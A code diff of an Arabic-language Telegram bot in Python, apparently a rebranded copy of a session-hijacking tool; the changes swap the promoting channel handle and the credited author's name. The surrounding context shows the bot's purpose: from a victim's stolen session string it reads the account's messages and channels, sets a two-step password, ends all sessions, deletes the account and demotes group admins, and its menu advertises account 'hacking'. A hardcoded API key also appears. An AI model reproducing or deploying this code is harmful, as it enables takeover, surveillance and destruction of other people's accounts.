@@ -78,7 +78,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('FTTUTY')
+      await X.edit_2fa('pp_g3')
       return True
     except:
       return False
@@ -155,7 +155,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "FTTUTY"
+channel = "pp_g3"
 menu = '''
 
 A  ➠   ** تحقق من قنوات ومجموعات الحساب **
@@ -186,7 +186,7 @@ M  ➠  ** تغييـر رقـم هـاتف الحسـاب **
 
 '''
 mm = '''
-**- عليك الانضمـام في قنـاة السـورس اولاً**  @FTTUTY
+**- عليك الانضمـام في قنـاة السـورس اولاً**  @pp_g3
 '''
 
 keyboard = [
@@ -211,7 +211,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("᥉᥆υᖇᥴᥱ ᥉ᥱꪔ᥆ َِ", "https://t.me/FTTUTY")
+    Button.url("𓏺𝗦َِ𝗼َِ𝘂َِ𝗿َِ𝗰َِ𝗲 َِ𝗰َِ𝗿َِ𝗶َِ𝘀َِ𝘁َِ𝗲َِ𝗻𓅛", "https://t.me/pp_g3")
     ]
 ]
 
@@ -256,7 +256,7 @@ async def start(event):
             Button.inline("N", data="NNN"),
             ],
           [
-            Button.url("᥉᥆υᖇᥴᥱ ᥉ᥱꪔ᥆", "https://t.me/FTTUTY")
+            Button.url("𓏺𝗦َِ𝗼َِ𝘂َِ𝗿َِ𝗰َِ𝗲 َِ𝗰َِ𝗿َِ𝗶َِ𝘀َِ𝘁َِ𝗲َِ𝗻𓅛", "https://t.me/pp_g3")
             ]
         ]
         await x.send_message(f"**- مرحبـاً بـك عـزيـزي\n- اليـك قائمـة اوامـر اختـراق الحسـاب عبـر كـود سيشـن تيرمكـس\n- اضغـط احـد الازرار للبـدء** \n\n{menu}", buttons=keyboard)
@@ -278,12 +278,12 @@ async def users(event):
         return await event.reply("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\n**- بواسطـة سيمو @FTTUTY**")
+        file.write(i + "\n\n**- بواسطـة ڪࢪستيڼ @pp_g3**")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس سيمو ❤️** \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس ڪࢪستيڼ ❤️** \n/hack", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"BBB")))
@@ -297,7 +297,7 @@ async def users(event):
     else:
       return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس سيمو ❤️**\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس ڪࢪستيڼ ❤️**\n/hack", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"CCC")))
@@ -327,8 +327,7 @@ async def users(event):
       else:
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس 
-سيمو ❤️**", buttons=keyboard)
+      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس ڪࢪستيڼ ❤️**", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"EEE")))
@@ -391,8 +390,7 @@ async def users(event):
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
       i = await user2fa(strses.text)
       if i:
-        await event.reply("**- صاحب الحسـاب لم يفعـل التحقق بخطـوتين\n- يمكنك الدخول الى الحساب بكل سهوله عبـر الامـر ( D )\n\n- شكـراً لـ استخدامـك 
-سيمو**", buttons=keyboard)
+        await event.reply("**- صاحب الحسـاب لم يفعـل التحقق بخطـوتين\n- يمكنك الدخول الى الحساب بكل سهوله عبـر الامـر ( D )\n\n- شكـراً لـ استخدامـك ڪࢪستيڼ**", buttons=keyboard)
       else:
         await event.reply("**- عـذراً .. صاحب الحسـاب مفعـل التحقق بخطـوتين**", buttons=keyboard)
 
@@ -408,8 +406,7 @@ async def users(event):
       else:
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("**- لقد تم انهـاء جميـع الجلسـات .. بنجـاح \n- شكـراً لـ استخدامـك ســورس 
-سيمو**", buttons=keyboard)
+      await event.reply("**- لقد تم انهـاء جميـع الجلسـات .. بنجـاح \n- شكـراً لـ استخدامـك ســورس ڪࢪستيڼ**", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"JJJ")))
@@ -423,8 +420,7 @@ async def users(event):
       else:
         return await event.respond("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود من قبـل صاحب الحسـاب ؟!**", buttons=keyboard)
       i = await delacc(strses.text)
-      await event.reply("**- تم حـذف الحسـاب .. بنجـاح \n- شكـراً لـ استخدامـك ســورس 
-سيمو**", buttons=keyboard)
+      await event.reply("**- تم حـذف الحسـاب .. بنجـاح \n- شكـراً لـ استخدامـك ســورس ڪࢪستيڼ**", buttons=keyboard)
 
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"KKK")))
@@ -461,8 +457,7 @@ async def users(event):
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("**- تم تنزيـل مشـرفيـن المجمـوعـة/القنـاة .. بنجـاح \n- شكـراً لـ استخدامـك ســورس 
-سيمو**", buttons=keyboard)
+      await event.reply("**- تم تنزيـل مشـرفيـن المجمـوعـة/القنـاة .. بنجـاح \n- شكـراً لـ استخدامـك ســورس ڪࢪستيڼ**", buttons=keyboard)
 
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"MMM")))
@@ -504,7 +499,7 @@ async def start(event):
         Button.inline("c", data="ccc"),
         ],
       [
-        Button.url("قنـاة السـورس", "https://t.me/FTTUTY0")
+        Button.url("قنـاة السـورس", "https://t.me/pp_g30")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
